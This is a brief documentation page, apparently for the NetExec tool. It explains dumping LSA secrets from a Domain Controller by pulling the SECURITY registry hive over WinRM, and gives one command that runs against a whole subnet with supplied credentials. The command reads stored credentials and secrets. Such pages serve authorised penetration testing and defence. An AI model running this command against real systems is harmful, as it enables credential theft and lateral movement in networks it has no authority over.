# Dump LSA

### Dump LSA secrets 
Extracts and downloads SECURITY registry hive, and uses secretsdump.py methods locally to dump secrets

{% hint style="danger" %}
Requires Domain Admin or Local Admin Priviledges on target Domain Controller
{% endhint %}

```bash
nxc winrm 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --lsa
```

